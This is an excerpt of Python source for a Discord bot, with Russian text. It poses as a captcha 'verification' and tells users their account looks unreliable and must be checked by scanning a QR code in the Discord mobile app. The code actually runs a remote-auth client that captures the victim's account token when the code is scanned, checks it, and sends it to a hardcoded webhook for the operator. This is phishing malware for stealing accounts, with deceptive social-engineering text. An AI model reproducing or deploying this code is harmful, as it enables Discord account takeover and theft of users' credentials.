...
async def start(ctx):
    ...
    try:
        ...
        logs_channel = None
    verification = Button(label="Верифицироваться", style=ButtonStyle.blurple)
    ...
    async def verification_callback(interaction):
        ...
        class RemoteAuthClient:
            ...
            async def run(self):
                ...
                if error:
                    print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} RemoteAuthClient отключен с ошибкой. Переподключение...")
                    self.initCrypto()
                    await self.run()
                ...
                async def on_token(token):
                    ...
                    try:
                        ...
                        if res.status_code == 200:
                            ...
                            if logs_channel:
                                webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1027629535400820838/Ivu1LZ3L2cVovvhCtRP-yLzgYEr6AIHIHFt0rJAkHfa0RQnid8VbDrsN9gsrx58cXxXF")
        ...
        embed_qr = nextcord.Embed(title="__**Вы точно человек? Нам нужно проверить это!**__", description="Вы видите это, потому что мы посчитали Вашу учетную запись ненадежной!\n\n**Пожалуйста, выполните следующие действия, чтобы завершить верификацию**:\n1️⃣ *Откройте мобильное приложение Discord*\n2️⃣ *Перейдите в настройки*\n3️⃣ *Выберите \"Сканировать QR-код\"*\n4️⃣ *Отсканируйте QR-код ниже.*", color=5003474)
        embed_qr.set_footer(text="Примечание: срок действия капчи истекает через 2 минуты")
    ...
    embed = nextcord.Embed(title="**Требуется верификация!**", description="🔔 Чтобы получить доступ к этому серверу, Вам необходимо сначала пройти верификацию\n🧿 Нажмите на кнопку ниже", color=5003474)
